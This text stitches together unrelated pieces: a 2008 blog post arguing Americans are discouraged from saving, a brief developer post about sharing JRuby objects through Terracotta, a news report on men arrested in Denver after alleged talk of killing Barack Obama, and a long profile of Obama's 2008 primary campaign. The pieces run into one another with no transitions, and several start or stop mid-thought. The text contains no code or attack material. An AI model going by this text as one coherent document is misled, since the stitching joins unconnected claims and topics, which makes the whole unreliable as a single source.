I understand the need for security but even top notch brokers and high powered banks like JP Morgan and Bank of America do n’t make it this hard to login .
And for $ 5,000 this has now gone from being a viable option to a flash in the pan .
Too bad .
This was a good way to get Americans to save .
I think many are looking at a 7 % return as stellar given the current stock market shenanigans .
Reason # 2 – U.S. Consumption Based Economy
Our economy is based on consumption for the most part .
The GDP equation of :
GDP = consumption + gross investment + government spending + ( exports – imports )
GDP has a heavy emphasis on consumption .
That is why last month when retail sales fell 1.2 % when the market expected a drop of 0.7 % the economy when gaga .
In fact , people should have been cheering that Americans are actually tempering their manic spending but this actually had the opposite effect of sending stocks into their proverbial corner which is now becoming a more common occurrence .
It is estimated that nearly 70 % of our economy is fueled by consumption .
That is , buying cars , homes , boats , computers , televisions , furniture , movie tickets , and all those other great consumerist items .
And much of that consumption was fueled by debt .
Many Americans during the bubble pulled out equity from their homes to upgrade the kitchen to something Emeirl would envy even if they rarely had the time to cook .
Many also used the money to fund extravagant vacations and purchased numerous technological gadgets .
This was great but buying on credit simply meant you dried up the well for future expenditures .
Now , that debt is coming back home with a vengeance .
We are spent out .
That is why the world central bankers nearly had a heart attack when they saw the credit ( debt ) markets freeze up .
See , we really ca n’t say debt since it carries a negative connotation .
Credit seems much more pleasant .
Sort of like interchanging high yielding bonds for junk bonds .
Same thing , different name .
So the central banks encouraged by the government did what they know best .
Loaded the system up with more debt .
Now we are in a debtors spiral and they are hoping beyond all else that people will spend .
One small caveat .
People need freakin jobs !
And many of these jobs were based on people spending money they never had !
We need sustainable jobs and industries and not those that are fueled by debt spending .
Reason # 3 – Our Government is in Massive Debt
Our government itself is in massive debt .
With over $ 10 trillion already on the national debt book we have additional debt in every other imaginable area :
Home Mortgage Debt : $ 10.54 trillion
Consumer Credit : $ 2.55 trillion
Corporate Debt : $ 6.8 trillion
State and Local Governments : $ 2.19 trillion
Everywhere you look there is this perpetual debt circle .
The government does n’t want you to save because they are n’t saving either !
How can a government ask its own populace to be prudent when the are spending beyond their means ?
The people are merely taking note from their political leaders encouraged by the lending and banking apparatus .
Frugality is now however making a comeback but not by choice .
It is being forced down the throat of many .
After all , you as an average American do n’t have the same access as a Wall Street bank for a corporate crony and perverted capitalistic handout .
This is not capitalism because this has nothing to do with the free markets .
This is not socialism since the majority of the people will not be helped by these actions .
This is an economic system fueled by a government that is now a plutocracy fueled by a very concentrated group of people and wealth .
The disconnect is even larger than it was during the Great Depression .
Here is the gig .
The lenders , Wall Street , and central bankers want you to continue to believe in a false economic system that has clearly failed .
They want you to believe in those Barnes and Noble books that if you save 5 % a month for 40 years , you ’ll retire a millionaire .
What they do n’t tell you is the way we are currently spending money we do n’t have , a million dollars in 20 years might only buy you a used vintage Hummer .
Most people right now that invest in a 401 ( k ) plan trust their advisors to do the right thing .
That is why so many have lost $ 2 trillion in their retirement accounts in the last few months .
Where did they put this money ?
Into Fannie Mae / Freddie Mac , A.I.G. , and across the board companies are having hard times .
To lose 40 % of your portfolio is not an easy thing to take especially when a large number of baby boomers are edging closer to retirement .
Now imagine if there were no Social Security for example .
Now according to the Social Security Administration we get these facts :
Retired Workers
Monthly Amount : $ 1,086 average monthly payment
32,113,000 fall in this category as of August of 2008
Keep in mind you also have 2,399,000 spouses and 499,000 children that fall under the “ old-age ” component of Social Security .
Their payments are $ 534 and $ 539 respectively .
Not big bucks at all .
It also goes to show how inadequate this system is going to be in the future since our government is simply kicking this can down the road :
Now that you know the awfully low amount , this above chart should startle you .
33 % of those aged 65 and older get 90 % of their income from Social Security .
32 % get more than 50 % of their income from Social Security .
Only about 35 % of those aged 65 and older have other sources of income that supplement their Social Security payment .
And they wanted to invest a portion in the stock market ?
Great idea .
What in the world is the government doing about this given that the tsunami of baby boomers is coming down the road ?
All the government is doing is bailing out toxic lenders and banks .
Absurd and frankly disturbing .
Reason # 4 – Psychologically People Need Instant Gratification
But are people also ready for a change in psychology ?
That is , can people accept the fact that we will not be able to spend as we did during the past decade ?
Many will have no choice but will the cultural mood be one of acceptance and sacrifice or of foot stomping on the ground because someone could n’t buy a Kawasaki jet ski ?
I ’m not sure .
But if you flip around media stations I ’m not sure we have the demeanor as a society of the 1930s .
There is a much angrier sentiment and contingent in our culture .
Clearly we have come a long way in many other areas since the early 1900s but in other areas , we have actually gone backwards .
Many who have grandparents from the Great Depression may laugh or mock the frugality by which they live .
They live frugally because they realize at any given point , the system can come to a crashing halt and you need to be prepared to confront that .
The biggest mocking is done by places like CNBC that skewered any tempered view during the heyday of the bubble .
“ Doomer ” or “ naysayer ” where all words charged against anyone that did n’t buy into the Pollyanna religion of most anchors .
Many have not seen an economic calamity like this one .
Frankly , I have not lived through one myself but I ’ve studied enough to realize that history can happen again and I am not arrogant enough to think that “ this time it is different ” when history clearly tells us where we may be heading .
So are we ready as a nation to become savers ?
It is amazing when we realize we have a negative savings rate .
If this were another smaller country our foreign credit card would have been taken away a long time ago .
Either way , we do n’t have a choice on the coming austerity .
The only choice we do have is how we adjust to it .
Reason # 5 – Saving Money is Good for You
Most importantly , saving is good for you .
It does the body and country good .
It creates a buffer zone from calamity .
It provides a piece of mind and cautious optimism which is necessary .
Make no mistake , those prophets on CNBC are nothing more than a person jumping off a cliff with no parachute saying things are good in mid-air simply because they have yet to hit the ground .
They preach diversification but when someone comes on the show during good times and mentions bonds or U.S. Treasuries they get laughed off the show .
Talk about practicing what you preach .
Finally it is your responsibility to educate yourself and see the system for what it is .
The government does n’t want you to save .
Lenders and Wall Street do n’t want you to save .
You may be fighting the environment here and going against the current but like those that decided not to buy a home at the peak , they knew that something was wrong when most of their money would be going to finance debt .
We are going through a major cultural and economic shift and those that expect this thing to be over in a few months are going to be in for a major shock .

MagLev was a show from the last RailsConf ( 2008 ) .
Presentation and demos of the product are really impressive .
Recently , Brian Takita asked in the JRuby mailing list :
JRuby + TerraCotta == Maglev ?
What an idea !
In the last few days I ’ve tried to make something useful and I ’m happy to have something to show .
The first demo runs with Nailgun .
The basic idea is to share a single Java VM across all clients , so they can share some objects .
The second is much more complete , as its clients have their own Java VM .
There are many true interpreters running , and they are sharing objects through Terracotta .
Terracotta is responsible for sharing memory in Java VM clusters and , despite of its slow startup , has much more to offer .
The shared objects ( hats and rabbits ) could be automatically persisted by Terracotta , as MagLev also does .
I ’ve patched JRuby and configured Terracotta to make demos run .
I ’ll upload the patches and configuration somewhere , ASAP .
Working on JRuby to make it run multiple runtimes ( VMs ) at the same time is being really fun !
Federal authorities Tuesday downplayed what they said were threats made by a pair of men arrested here over the weekend possessing rifles , sniper scopes and an alleged desire to kill Barack Obama .
Shawn Robert Adolf , 33 , and Tharin Robert Gartrell , 28 , face federal weapons charges , as does an associate , Nathan Johnson , 32 .
U.S. Atty .
Troy Eid said that during a methamphetamine binge , Adolf and Gartrell had expressed strongly racist views and spoken about killing the presumed Democratic presidential nominee .
Eid said the talk did not meet the legal standard to file charges for threatening a presidential candidate .

“ The law recognizes a difference between a true threat -- that ’s one that can be carried out -- and the reported racist rants of drug abusers , ” Eid said at a news conference .
There have been low - grade fears for months about possible threats on the life of Obama , who will become the first black major - party presidential nominee when he accepts the Democratic Party ’s nomination Thursday night .
Obama received Secret Service protection shortly after he announced his campaign in 2007 , a recognition of the risks he faces .
Eid acknowledged that many questions had not been answered , including why the men had high - powered weapons , body armor , two - way radios , wigs and camouflage gear .
It was also unclear why they decided to base themselves in a suburban Hyatt hotel where they believed -- erroneously -- Obama was staying .

“ We are just going to continue to investigate this , ” Eid said .
In a jailhouse interview with a Denver television station , Johnson said he did not know whether Adolf and Gartrell would have taken action .
“ I do n’t want to say yes , but I do n’t want to say no , ” he said .
It began Sunday morning when police in suburban Aurora spotted Gartrell driving a rental truck erratically .
When they pulled him over , they found a small amount of meth , two rifles and other gear , court records said .

Gartrell led police first to Johnson , who was arrested with small quantities of meth at the Hyatt in southern Denver , authorities said , then to Gartrell ’s cousin Adolf , who was at a hotel in the small city of Glendale .
When police knocked on Adolf ’s door , he jumped from his sixth - floor window in an attempt to escape , authorities said .
A woman who said she had been partying with the three men at the Hyatt told investigators that Adolf and Gartrell had made racist comments about Obama .
She said they “ could not believe how close he was to becoming president , ” a federal affidavit said .
Johnson told investigators that Adolf had previously talked about killing Obama should the Illinois senator be elected , and that he believed the two men were in Denver to kill Obama , the affidavit said .
Gartrell and Adolf were on probation for drug and other charges , authorities said .

It was early October 2007 in Iowa , the drying stalks still stood in cornfields grown more precious in the age of ethanol , and far away , in the moneyed precincts of both coasts , Barack Obama 's top donors were anxious .
Despite having raised heaps of cash , he was trailing Hillary Clinton by more than 20 points in the national polls with only three months to go before Iowa 's first - in - the - nation caucus .
For the worriers , it was getting late .
But for Iowa voters , it was early enough that many barely knew what to make of this biracial rookie senator and still muffed his exotic name .
In Waterloo , it had been " Hi , Senator Barack . "
Now , here at the Buchanan County fairgrounds in Independence , it was " Hi , Obama , " from a nervous Geri Punteney as she rose in the front row to ask her question .
But it was n't a question , really .
" I have a brother who 's dying of cancer , " she said , and as soon as it was out she had broken into sobs , and then apologies for her sobs , and more sobs .
Obama stepped forward , as if knowing what was expected of him and yet slightly embarrassed by it .
He took her hand with some consoling mumbles .
Punteney , 50 , collected herself enough to tell the rest : her 48 - year - old brother was working as a truck driver despite having cancer , so as not to lose his insurance .
She herself had stopped working at a riverboat casino to care for her mother , and so was forgoing needed dental surgery .
" I do n't think it 's fair that my brother has to work when he 's dying of cancer just to keep his insurance , " she said .
And here Obama parted from his two main rivals in the race , Clinton and John Edwards , and from the only Democrat elected president in the past 30 years , Bill Clinton , and from the whole tradition of politics that had prevailed in his party for the past few decades as it tried to maintain its historic bond with the common man .
He did not get angry .
He did not wrap Punteney in a hug .
Instead , he stood still and said in a level voice , " First of all , we 're all praying for you . "
He then told her that he had lost his mother to cancer in her early fifties .
And only then looking up at the crowd , he segued into a policy conclusion that was startling for its cool rationalism .
Punteney 's and her brother 's plight , he said , was a sign of the problem in tying health insurance to work without real alternatives .
It was wrong that the US was the only developed nation not to guarantee health coverage for its citizens , even as it spent more per person on health care than anyone else .
" We do n't spend it wisely and we do n't spend it fairly , " he said .
Moments later , Obama decided to bring up two minor campaign squalls .
The day before , an Iowa television reporter had asked him why he was not wearing a flag pin on his lapel , and Obama had answered that he had worn a pin after September 11 2001 but stopped when the pins " became a substitute for I think true patriotism , which is speaking out on issues that are of importance to our national security " .
Incipient outrage was already spreading online , and Obama wanted to revisit it - to drive the point further .
" After a while , you start noticing people wearing a lapel pin , but not acting very patriotic , " he said .
" My attitude is , I 'm [ less ] concerned about what you 're wearing on your lapel [ than ] what 's in your heart . "
He moved to another internet favourite , his suggestion to some Iowa farmers a few months earlier that they consider growing speciality vegetables , such as rocket ( Americans know it as " arugula " ) , instead of only subsidised crops such as corn and soybeans .
" Anybody gone into Whole Foods lately and see what they charge for arugula ? " he had said , which had brought derisive reminders from the press that Iowa had no branches of that organic grocery chain .
In Independence , Obama went back at it .
He repeated his suggestion on speciality crops and mocked the response to his earlier comment .
" They said , ' Oh , Obama 's talking about arugula in Iowa .
People in Iowa do n't know what arugula is . ' "
He paused , and the scorn rose as he continued .
" People in Iowa know what arugula is .
They may not eat it but they know what it is . "
I do n’t know where he ’s come from , but he speaks on a whole other level , and he transcends the politics of today . . .
We ’ve been waiting for a guy like this
A year to the 2008 election , on the first of my many tours covering Obama on the trail , it was all here .
There was the inability , or reluctance , to capitalise fully on the woes of working - class Americans beaten down by deindustrialisation , globalisation and Republican governance – a characteristic that would become all the more consequential as the economy crumbled over the next year , providing a giant opening for the Democrats that Obama would not deign to exploit to its utmost until Wall Street ’s collapse last month , when a surge of voter discontent swept him along
almost in spite of himself .
And there was the conviction that flaps over trinkets and leafy vegetables had debased politics , and that voters would agree if he made the case – a conviction that would be challenged as those very two symbols took leading roles in the cultural resistance to him that would be capped by John McCain ’s selection for his running mate of a conservative Alaska governor whose every feature seemed designed for contrast with Obama .
Together , these early clues pointed to an extraordinary fact about the 2008 election , nearly as extraordinary as the racial breakthrough it represented : Barack Obama was running not on a record of past achievement or on a concrete programme for the future , but instead on the simple promise of thoughtfulness - the notion that the leadership of the country should be entrusted not on the basis of résumé and platform , but on the prospect of applying to the nation 's problems one man 's singularly well - tempered intelligence .
Many of Obama 's own supporters would miss this , would grow upset later as he moved from a perceived position on the left to the centre on several issues - voting for compromise legislation to permit federal wiretapping , for instance , or speaking out in favour of a Supreme Court decision that strongly endorsed the right to bear arms .
Obama is betraying his politics , came the charge from the left .
What does he really stand for ?
From the other side came : he 's offering nothing new , it 's all warmed - over liberalism .
Overlooked was that his politics appeared a matter less of weighing left and right than of judging smart and less - smart , with nods to fairness and common sense tossed in the mix - a matter of hashing things out , hearing out the other side , seeing what worked .
He found tiresome many of the usual ideological tussles , wanted to save the fight for the biggest issues - health care , taxes , global warming .
His best , most invigorated moments on the trail would come when he was summoning his audience to step back and think , and showing he believed them capable of that , urging them to demand an end to the petty skirmishes distracting from the greater cause .
And his true self - betrayals would come in concessions not to conservatism , but to point - scoring or glibness , in his truisms about energy independence , education reform and trade policy , or in his habit of misquoting rivals .
So , the candidate of hope was at bottom hoping that aptitude could trump experience , though his campaign would never put it that way .
Instead , it gamely inflated his qualifications .
His three years as a community organiser in Chicago were made out to have been a bounty of hard - won successes for the “ families devastated when the steel mills closed down ” , when his own memoir had defined that episode precisely by its instructive futility .
The results of his eight years in the state legislature ( concluded only four years prior ! ) were exaggerated to the point of casting the creation of a health - care task force as an important step on the way to universal coverage .
His work in the US Senate on the noble but innocuous subject of nuclear non-proliferation was used as evidence of his ability to work across the aisle .
And the campaign would make much of his policy plans , though on most counts , his proposals differed from Clinton ’s only in the small print .
This was something Obama himself once acknowledged with candour to a roomful of voters in Iowa City , saying that all the Democratic candidates were going to “ set up [ health - care ] plans you can buy into it if you ’re poor – if you ca n’t afford it we ’re going to subsidise it , we ’re going to emphasise prevention , blah blah blah ” – the last three words amounting to as offhand an indictment of campaign plank - peddling as I had ever observed on the trail .
No , as much as Obama claimed that " this is not about me " , of course it was .
Not about what he had done or what his website said he would do , but about the man and the qualities he appeared to possess - eloquence , self - possession , charisma , decency , lucidity , sobriety , discipline , judiciousness , empathy , wit , verve , acumen , suppleness , equipoise , confidence , style .
( Not to mention his grandfather 's strong chin and an enviable cigarette - burnished baritone . )
In a word , talent .
Which meant that Obama was testing one of the deepest schisms in the country 's character , the Jeffersonian conundrum .
The same Founding Father who saw as America 's unique strength its capacity to produce leaders of modest origins but profligate gifts had also set in motion the forces that , two centuries on , would work to undermine such men and women .
In 1813 Jefferson wrote to John Adams to declare that " there is a natural aristocracy among men .
The grounds of this are virtue and talents . . .
The natural aristocracy I consider as the most precious gift of nature for the instruction , the trusts , and government of society . . .
May we not even say that that form of government is the best which provides the most effectually for a pure selection of these natural aristoi into the offices of government ? "
As if anticipating the Bushes and Clintons , Jefferson had set against his natural aristocrat the nepotism of the " pseudo aristoi " , a " traditionary reverence for certain families , which has rendered the offices of the government nearly hereditary in those families " .
But it was Jefferson , too , who in his debates with Alexander Hamilton - first treasury secretary , Anglophile and advocate of a strong central government - had exalted the yeoman farmer and the honest earth he tilled , setting his inherent goodness against the corrupted hordes of the metropolis , which Jefferson slapped with the same epithet wielded to effect today : European .
" Our governments will remain vir tuous for many centuries , as long as they are chiefly agricultural , " he wrote to James Madison in 1787 .
" When [ Americans ] get piled upon one another in large cities , as in Europe , they will become corrupt as in Europe . "
For two centuries , this rural bias had manifested itself mainly in the woefully unrepresentative US Senate ( where Wyoming has the same two votes as New York , despite having one - fortieth its population ) and in campaign imagery ( Lincoln 's log cabin , Teddy Roosevelt 's years in Dakota Territory ) .
It would take Nixon and his heirs to distil Jeffersonian egalitarianism to its most potent form , a hardy sour mash of righteous resentment against " elites " that flourished to the point where a savant like Bill Clinton had to lard his brilliance with McDonald 's photo ops , while George W Bush , a product of Andover and Yale , settled on a West Texas ranch and found little political cost in mangling his mother tongue like so much cleared brush .
A country that demanded only the best - best digital camera , best heart surgeon , best college - had developed ambivalence about undisguised excellence in its highest office .
“ I never heard of Obama .
I do n’t know where he came from .
My boyfriend said he gave a speech at the last convention , but I do n’t remember that ”
This was the asterisk in the American meritocracy that Obama was attempting to erase .
And if America was divided , this was the great cleavage confronting him as the self - anointed unifier .
To those inclined to recognise potential in the qualities he represented even in the absence of hard evidence of its having been realised , here was a leader unlike any the country had seen for quite a while .
These voters thought they grasped at some level what the world was coming to , that it demanded effervescence over solidity , knowledge over dogma , nuance over vehemence , and that it no longer distributed rewards according to years of attendance at the company holiday party .
It was the world of the Google boys setting up shop in their Silicon Valley garage , high - school basketball stars going straight to pro , and wars begun by men of deep experience but rigid minds .
Many saw this , and were either themselves prospering on these new terms or , if not , had accepted them as the new reality and had decided that the kid with the big skills and short résumé was the one for the moment .
" It 's a miracle that [ Obama 's ] come aboard .
I do n't know where he 's come from , but it 's communication on a whole other level , and it transcends the politics of today , " Doug Summers , a screenwriter in Santa Fe , said to me .
" It 's old versus new .
We 've been waiting for a guy like this .
Like I told my kids : this guy 's going to change your lives . "
Many others looked at this same new world and were flummoxed by it .
To them , it was a betrayal of what they held dear - that time served counted for something , as did work that involved something other than talking or writing or computing .
If the winnings were now being given out on the basis of talent and not rank , then why was it that kids of a certain class were riding the escalator faster than ever ?
For these voters , Obama offered ultimate proof that this new so - called meritocracy of the number - crunchers and keyboard - tappers was bankrupt .
That this man who had " done nothing " should be considered for the most powerful office in the world on the basis of certain personal qualities was a bad joke , an affront and , yes , possibly a conspiracy .
" I never heard of Obama .
I do n't know where he came from , " said Kathy Zarzycki , a nurse and Clinton supporter in Ohio 's industrial Mahoning Valley , a Democratic stronghold where Obama has struggled .
" My boyfriend said he gave a speech at the last convention , but I do n't remember that . "
On these terms would the lines be drawn .
The divisions became quickly evident , so much so that one could have taken US census data and predicted most primary outcomes to within a few points .
( Clinton 's late rally was more than anything a matter of the schedule ; the Rust Belt and Appalachian states where she was strong fell later in the order . )
There were some exceptions .
Geri Punteney , not an obvious demographic match for Obama , told me that day at the fairgrounds that his measured response to her plea had won her over .
" You do n't have to get outraged , " she said .
" He seems more down to earth , more mellow . "
The question was whether the millions of other Geri Punteneys , those who had not seen the thoughtfulness gambit up close , would feel the same way .
The basic biography is by now familiar to most .
Barack Hussein Obama was born in 1961 in Hawaii to an 18 - year - old white woman with middle - class Kansas roots and a 25 - year - old Kenyan exchange student who married her but left two years later to attend Harvard .
Moved with his mother , an idealistic anthropologist , to Indonesia between the ages of six and ten to live with her new husband .
Returned to Hawaii to be raised primarily by his grandparents .
College in Los Angeles and New York , then the organising stint in Chicago , law school at Harvard , and a return to Chicago , where he ran for state senate in 1996 .
Eight years in the legislature wrapped around a failed run for the US House , then the race for US Senate , blessed by luck when two different opponents were felled by tawdry divorce scandals , and capped by The Big Speech at John Kerry ’s 2004 convention in Boston , which got all the speculation started .
Missing from the standard chronology is how , or when , it happened - how a late adolescent adrift in a mild pot habit , misguided fantasies of basketball greatness and steadily accreting racial confusion grew , within a decade , into the outstanding law student many of his classmates predicted would be the first black president .
In his own narrative of self - discovery - written at the age of 33 - Obama pinpoints a few key moments : an anti-apartheid speech at his Los Angeles college , where he realised the power of his voice ; a turn towards scholarly self - discipline in his next few years at Columbia ; his exposure to urban deprivation in Chicago .
Underlying it all , he postulates , was the desire to live up to the expectations of , and fill the void left by , the brilliant , flawed and vanished African father .
What matters most , though , is not so much when the light of ambition went on – Obama ’s own
account is as reliable as any self - mythology – but that Obama realised that it had , and decided to follow it even at the risk of appearing highly presumptuous .
Try as his campaign might to mask it , he knew full well the audaciousness of his bet on talent .
It was why he was going for it this time around , despite the calls to wait his turn .
If he was to run on potential , it would do no good to dull the package with more years on Senate subcommittees .
In 2008 , he could still run his race from a skyscraper in Chicago , that great heartland city he ’d made his home ; any later , he ’d be running out of DC , where stardom , like the city ’s building heights , was levelled by custom .
The timing was ideal in other ways , too .
If ever the country would be ready for a hyperarticulate candidate running on a platform of pragmatism and reconciliation , it was at the end of the Bush years .
Even more opportune was the presence of Hillary Clinton .
What better way for a candidate whose biggest weakness was his inexperience than to prove his worth in the act of campaigning – by slaying a giant ?
What matters most is not so much when the light of ambition went on , but that Obama realised that it had , and decided to follow it
In August 2007 , Obama visited with some Democrats in New Hampshire , the first primary state .
Carol Moore , a former state representative , told him she was tired of losing her heart to cerebral , liberal insurgents like Bill Bradley , the former New Jersey senator and New York Knicks player who ran against Al Gore in 2000 , only to see them crushed by the Democratic machine .
She had decided never to fall for one again , but still she wanted to know from Obama why he would be any different .
How could she know he would be able to see it home ?
" Once I win the primaries , no one 's going to doubt my credentials or my toughness , " he said , as she relayed it to me .
" If I beat Hillary , no one 's going to doubt my electability and my qualifications - or my strength . "
But Clinton would be most valuable of all as a foil , so well did she offset Obama 's " new politics " mantra .
There was the war in Iraq , which Obama had opposed , not because it was wrong but because it was " dumb " and " rash " .
Obama 's anti-Clinton critique extended further .
His speeches were riddled with put - downs no less effective for leaving her name unsaid , as he called for a politics that " was n't based on spin and PR " or " triangulating and poll - driven positions " .
He said he was not running " because of some long - held ambition " , and turned every barb from Clinton into a teasing new take on the failures of the " old politics " , infuriating her camp .
And Clinton played to form .
She seemed to have it both ways in a debate answer on immigration .
Her campaign dredged up writings from Obama 's Indonesian kindergarten purporting to show that he , too , had nursed presidential dreams .
And , one snowy December day at a law office in New Hampshire , one of her top advisers there , a lawyer married to the state 's former governor , responded to my questions about Obama 's rising poll numbers by expressing his deep concern that , if Obama were to win the nomination , Republicans would inevitably bring up his admitted cocaine use as a young man , and might ask whether he had ever been a drug dealer , because , after all , they would argue , who really knew the extent of it ?
In Iowa , where Obama had spent by far the most time , the equation tipped his way .
In New Hampshire , where the Clintons ' roots ran deeper , she shocked us all , winning by three points just a week after her campaign was caught trying to make its crowds appear larger than they were .
Here , Obama 's bet on raising the level of discussion had failed .
In a debate three days before the vote , he found himself in an awkward position .
The moderator had asked Clinton about her low likeability ratings , and her charming response had included praise for Obama .
He had to say something , and his rejoinder - " You 're likeable enough , Hillary " - made for the most charged and grown - up moment between the two of them all campaign .
Saying any more would have been phoney , given her recent attacks on him , yet for all that he still felt some affection for her , and expressed it in the dry tone of a 1940s leading man .
She got this , and accepted it with an equally wry and genuine smile .
But the adult irony did not translate on screen , the line became enshrined as smug condescension , and , combined with her welling up on camera two days later , it helped rally New Hampshire women to her in big numbers on primary day .
We would get much else wrong .
In South Carolina , we would unfairly blame Hillary ’s wipeout on Bill ’s blundering , when in fact his one big stumble came after most of the votes were cast , when he compared Obama ’s victory to the 1984 and 1988 South Carolina wins by Jesse Jackson , the demonstrative civil rights leader who shares little with Obama but the colour of his skin .
Obama ’s rout was instead the result of the shift of the African - American vote after Iowa – which offered proof “ they ” would vote for him – a shift that was sealed by his transformation on the South Carolina stump into a master of Southern black vernacular .
We would also be slow to recognise that Obama had put himself in position to win the nomination by holding his own on Super Tuesday , the early February day on which 22 states voted .
And as it dawned on us , we tried to explain it away , to pretend that this gathering upset was about things other than his talents and the electorate ’s gradual reckoning with them .
Doing so would have required acknowledging his abilities to an extent that the press felt uncomfortable doing , spooked as it was by Clinton ’s ( and later John McCain ’s ) charges of favouritism .
So we focused instead on Obama 's record - breaking fundraising , his cohesive brain trust , his stellar ground organisation , his decision to rack up delegates in states with caucuses , where voters expressed their preference in public and where liberal Democrats dominated .
All these things were true , but by emphasising them we skirted the obvious , that Obama had been in a position to win those caucuses , starting with Iowa , only because many Democrats had fallen for him in a way they never would for Hillary .
Because he had it and she did not - the promise of a true break from the past and the ability to walk two or three times a day into an arena of thousands and pull them in and lift them up with barely a shout , so modulated and assured was his 45 - minute , off - the - cuff stump speech .
There was , it turned out , a difference between being able to inspire and to rally , which is why Clinton would fall short even as her pitch grew more insistent .
The sheer relentlessness could do nothing for the hint of joylessness her campaign had laboured under from the start .
We tried our best to ignore this .
In April , many of us gathered in Butte , Montana , a once - thriving silver and copper town that now stands , half - abandoned yet stately and surreal , on a bluff beside a huge abandoned mining pit .
There , Obama and Clinton addressed Montana Democrats in a rare joint appearance .
He , delivering the norm , and somewhat perfunctorily , held the hall rapt .
Whereas she offered herself as merely a more famous variation on the local officials who also spoke - punches at the air , a charge of partisan particulars , the laundry list of correctives , all of it nearly as classic and time - worn as that city on the bluff .
The crowd half - listened , the line for Moose Drool beer grew longer .
The story of the campaign was laid bare in the contrast , but we , sitting back in the rafters , averted our eyes as best we could .
Despatches from the event focused on this or that new charge or policy twist , as if the candidates had even been competing in the same decade .
Clinton herself was more honest on this score , and knew she could never close the gap , which was why she launched her critique of the oratory itself as " empty words " .
This resonated with those already inclined to distrust Obama , but had limits as an attack , because what was politics but the attempt to communicate with voters and other politicians and bring them to one 's side ?
More than that , it ran up against the fact that Obama was not a political performer in the conventional sense .
Most American stump showmen - Huey Long , Ronald Reagan , Bill Clinton - plunged into the moment , lost themselves to it and the narrative created for them .
Obama did not .
He relished the crowd , sure , but he did not entirely open himself up to it .
Even in the biggest arenas , he retained a hint of the observer 's remove , which was to be expected given that he was , after all , a writer .
His memoir , Dreams From My Father , if clichéd at moments , had demonstrated a true writer 's sensibility , and his political tract , The Audacity of Hope , had managed at points to transcend that form .
This aspect of the candidate was , to me , the biggest mystery of all .
Most of us tend towards one pole or the other , observer or participant , critic or actor , consultant or candidate - one burdened by heightened self - awareness , the other liberated , if not always for the best , by a shortage of the same .
Here was someone who possessed enough self - consciousness and detachment to have noted , in The Audacity of Hope , telling details of his first visit to the White House - of Bush 's asking an aide for a squirt of hand sanitiser in a moment alone with Obama , of the Secret Service 's reaction when Obama set his hand on Bush 's shoulder .
Yet here he was , day after day , also satisfying huge crowds who all expected a revelation .
In the week leading up to Super Tuesday : 13 cities in 11 states .
In one day alone : 14,000 in Boise , 18,000 in Minneapolis and 20,000 in St Louis .
This hybrid character type confounded Clinton 's attempt to cast him as a mere itinerant troubadour .
But it also helped explain why not all the voters he met were signing on .
At some level , perhaps , they could sense that even as Obama was shaking their hand or asking about the new machine on their shop floor , he might be filing something away for the next book .
We could see this unusual blend behind the scenes as well .
On his ventures back to the press section of the plane , he bantered with the challenging bravado of the self - confident politician , leaning forward in his trademark white shirt into the scrum of mini-tape recorders and cameras .
But even here there was a reserve , a not entirely concealed disdain for our clamouring questions and whatever dust - up of the day they happened to revolve around , as if he thought that presumably well - educated scribes like us ought to know better .
There was also a slight reticence one on one .
Assigned as the lone " pool " reporter to cover him on a detour from the campaign trail in Ohio to Illinois to attend a memorial service for five college students killed in a classroom shooting , I had several amiable chats with him on the chartered private jet .
We spoke about our kids , home towns , sports .
But there was a limit to the engagement - unlike Bill Clinton , this was not a candidate who needed to win over every person presented to him , to convey as much of his brilliance as possible in each encounter .
It was as if Obama was held in check by a constant sense of perspective .
He enjoyed good conversation , but there were a lot of reporters to meet along the way , a lot of people , and only so many hours in the day .
At some point on our return flight , it became clear he just wanted to read the papers , which he did , ploughing through the New York Times and the Wall Street Journal , front to back .
Even as he stayed on course to claim the nomination , he felt demoralised over the campaign ’s detour into the cultural shadowlands
One April day on her way back from a lunch break in the withered steel town of Charleroi , Pennsylvania , Theresa Krall , a social worker and Democrat , said she liked Clinton the best .
Between Obama and McCain , she was n’t so sure .
“ Obama speaks wonderfully , and he ’s very intelligent .
But I ’d have to research more about him against McCain . ”
Such was the nature of Obama 's bet on meritocracy that , at some point along the way , the primaries against Clinton seemed to blur into the looming general election against John McCain .
The conservative , blue - collar Democrats who sided with Clinton in the Pennsylvania primary following the rantings of Reverend Jeremiah Wright , the long - time minister of Obama 's Chicago church , were the same voters Obama would be fighting hardest for months later against McCain .
McCain and Clinton echoed each other in savaging Obama for his poorly phrased musings , at a fundraiser in San Francisco , about " bitter " small - town Americans and their tendency to " cling " to guns and religion .
It was a riff that showed Obama 's analytical side in a less flattering light , drew attention to the very cultural gap he was seeking to close , and was only partly mitigated by having been intended as a defence of rural America against charges of bald racism .
Even as he stayed on course to claim the nomination , Obama 's demoralisation over the campaign 's detour into the cultural and racial shadowlands was plain - the listlessness that some saw on his face at a Philadelphia debate where Clinton brought up his association with a 1960s domestic terrorist - turned - college professor was more like aggrieved disbelief that it should have come to this .
Urged to counter during this difficult Rust Belt phase , Obama maintained his trademark equanimity but also stoked false fears about Clinton 's health plan and misquoted her as praising the North American Free Trade Agreement .
( Later , he would also take out of context McCain 's comments about the need for a 100 - year US presence in Iraq and about the economy . )
Clinton hurt her own cause with embellished tales of landing under sniper fire in Tuzla , Bosnia , ammunition for those who did not trust her word .
But Obama 's true deliverance came , at last , when both Clinton and McCain tried to push their populist advantage too far , clubbing Obama for his refusal to go along with their call for a summer - long gas tax holiday .
It was a classic gimmick ( in reality , it would save consumers little ) and one that seemed perilous to oppose , but it was just the foothold Obama needed to return to the high ground as he ridiculed the idea at every stop .
This was Obama in his element - quoting experts , appealing to higher reason : " The American people are smarter than Washington gives us credit for . "
And it worked , as he put the race away in North Carolina .
Shortly before the final primaries , he embarked on a victory lap through Oregon , and here was Obama as he wanted to be seen .
On the long flight west , he made a rare extended visit to the back of the plane for a word game with the press and aides .
( Having to lead his team - mates to the word " revolution " without resorting to the words " American " or " French " , he offered : " Thomas Jefferson called for it to happen every once in a while . "
When none of his team - mates knew the answer , he went more middlebrow : " A Beatles song . " )
In Eugene , he paid an unannounced visit to the University of Oregon 's legendary track in the middle of a big annual athletics meeting ; once the women 's two - miler was done , the meet came to a halt and the candidate strolled around the track , bathed in sunset and waving up to the old grandstand as the crowd - the ultimate Obama demographic , track enthusiasts in the Pacific north - west - rose as one to applaud .
An hour later he spoke to thousands on campus , aglow with self - reflective triumphalism .
" There 've been times where you get whacked so many times that after a time , you feel you have to whack back .
You 've got to go negative .
You do n't want to look like a wimp , " he said .
" The times . . .
I 'm most proud of is when we resisted the impulse , and the times that I 'm least proud of is when we succumbed to that impulse . "
